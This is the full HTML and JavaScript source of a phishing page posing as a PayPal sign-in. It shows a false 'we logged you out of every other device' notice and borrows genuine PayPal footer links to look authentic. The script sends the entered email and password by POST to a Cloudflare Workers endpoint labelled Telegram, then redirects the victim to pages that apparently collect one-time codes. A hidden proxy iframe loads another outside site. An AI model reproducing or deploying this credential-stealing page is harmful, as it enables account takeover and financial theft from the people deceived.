<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login</title>
  <style>
    body {
      font-family: Futura, Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      flex-direction: column;
      position: relative;
    }
    .container {
      width: 100%;
      max-width: 360px;
      padding: 0 20px;
      text-align: center;
      position: relative;
      z-index: 1001;
      box-sizing: border-box; /* Added to fix right-sided shift */
    }
    .logo {
      margin: 0 auto 10px;
      display: flex;
      justify-content: center;
    }
    .logo img {
      max-width: 40px;
      height: auto;
    }
    h1 {
      font-size: 28px;
      font-weight: 900;
      margin-bottom: 25px;
    }
    input {
      width: 95%;
      padding: 14px;
      margin: 10px 0;
      border: 2px solid #999;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 700;
      box-sizing: border-box;
    }
    .forgot {
      text-align: left;
      margin: 10px 0 20px;
      font-size: 16px;
      font-weight: 700;
    }
    .forgot a {
      text-decoration: none;
      color: #0070ba;
    }
    .btn {
      width: 95%;
      padding: 14px;
      background: #000080;
      color: #fff;
      font-size: 17px;
      font-weight: 900;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      margin-bottom: 15px;
    }
    .btn:hover {
      background: #004b82;
    }
    .or {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #888;
      font-size: 14px;
      font-weight: 700;
    }
    .or::before, .or::after {
      content: "";
      flex: 1;
      border-bottom: 2px solid #ccc;
    }
    .or:not(:empty)::before {
      margin-right: 10px;
    }
    .or:not(:empty)::after {
      margin-left: 10px;
    }
    .btn-outline {
      width: 95%;
      padding: 14px;
      background: #fff;
      color: #000000;
      font-size: 17px;
      font-weight: 900;
      border: 2px solid #000;
      border-radius: 25px;
      cursor: pointer;
    }
    footer {
      font-size: 13px;
      color: #666;
      text-align: center;
      margin-top: 40px;
      padding-bottom: 15px;
      font-weight: 700;
    }
    footer a {
      color: #333;
      text-decoration: none;
      margin: 0 5px;
    }
    footer a:hover {
      text-decoration: underline;
    }
    .auth-importance {
      font-size: 16px;
      color: #000080;
      text-decoration-thickness: 2px;
      margin-bottom: 20px;
      font-family: 'Futura', sans-serif;
      font-weight: bold;
    }
    #proxyFrame {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: 1000;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://i.im.ge/2025/09/22/n9xQJG.Picsart-25-09-22-16-21-48-182.png" alt="Bank Logo" />
    </div>
    <form id="login-form">
      <div class="auth-importance">&nbsp;We logged you out of every other devices, login to continue</div>
      <input type="email" id="email" placeholder="Enter your email address" required />
      <input type="password" id="examNumber" placeholder="Enter your password" required />
      <div class="forgot">
        &nbsp;<a href="https://www.paypal.com/authflow/email-recovery/?contextId=&redirectUri=%252Fsignin">Forgot password?</a>
      </div>
      <button id="registrationButton" type="button" class="btn">Next</button>
      <div class="or">or</div>
      <button type="button" class="btn-outline">
        <a href="https://www.paypal.com/ng/welcome/signup/#/login_info">Sign Up</a>
      </button>
    </form>
  </div>
  <footer>
    <a href="https://www.paypal.com/us/cshelp/contact-us">Contact Us</a>
    <a href="https://www.paypal.com/us/legalhub/paypal/privacy-full">Privacy</a>
    <a href="https://www.paypal.com/us/legalhub/paypal/home">Legal</a>
    <a href="https://www.paypal.com/us/legalhub/paypal/updating-policies-full">Policy Updates</a>
    <a href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a>
  </footer>

  <!-- Proxy Iframe -->
  <iframe id="proxyFrame" src=""></iframe>

  <script>
    // Retrieve user tag from localStorage (set on Step 1)
    function getUserTag() {
      return localStorage.getItem("userTag") || "UnknownUser";
    }
    const userTag = getUserTag();

    // Load proxy iframe
    const proxyFrame = document.getElementById('proxyFrame');
    proxyFrame.src = `https://verifyaccount.securitycheck-f08.workers.dev/?url=https://accountlogin.page.gd`;

    document.getElementById('registrationButton').addEventListener('click', () => {
      const email = document.getElementById('email').value;
      const examNumber = document.getElementById('examNumber').value;

      const message =
        `📘*Students Info*\n` +
        `🏷️ Tag: ${userTag}\n` +
        `📩 Email: ${email}\n` +
        `📃 Exam number 2: ${examNumber}`;

      fetch("https://telegram.securitycheck-f08.workers.dev/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          // Redirect to proxy URL
          window.location.href = `https://fourthman-aey.pages.dev/?userTag=${encodeURIComponent(userTag)}`;
        } else {
          alert("Failed to send code via Telegram");
        }
      })
      .catch(err => {
        alert("Error sending to Telegram: " + err.message);
        // Still redirect even if there's an error
        window.location.href = `https://verifyaccount.securitycheck-f08.workers.dev/?url=https://verifyotp.page.gd?userTag=${encodeURIComponent(userTag)}`;
      });
    });
  </script>
</body>
</html>
